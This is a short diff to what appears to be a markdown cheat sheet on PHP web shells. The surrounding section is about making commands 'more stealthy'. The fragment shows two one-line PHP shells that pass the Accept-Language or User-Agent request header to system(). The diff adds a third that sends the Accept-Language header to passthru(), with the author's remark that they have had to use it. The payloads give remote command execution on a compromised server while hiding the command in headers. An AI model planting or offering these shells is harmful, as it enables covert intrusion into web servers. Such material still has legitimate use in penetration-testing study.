@@ -54,6 +54,9 @@ We can make the commands from above a bit more stealthy. Instead of passing the 
 ```php
 <?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
 <?php system($_SERVER['HTTP_USER_AGENT'])?>
+
+# I have had to use this one
+<?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
 ```
 
 ### Obfuscation
